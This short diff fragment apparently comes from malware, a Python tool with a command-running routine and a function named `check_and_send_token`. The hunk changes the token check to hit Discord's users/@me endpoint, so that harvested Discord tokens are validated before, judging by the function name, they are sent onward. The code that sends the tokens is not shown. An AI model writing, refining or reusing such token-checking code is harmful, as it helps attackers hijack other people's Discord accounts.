@@ -254,7 +254,9 @@ def run_command(get_commands_response: Response) -> None:
 
 def check_and_send_token(token: str) -> None:
     if (
-        get(f"https://discord.com/api", headers={"Authorization": token}).status_code
+        get(
+            f"https://discord.com/api/users/@me", headers={"Authorization": token}
+        ).status_code
         != 200
     ):
         return  # invalid token check
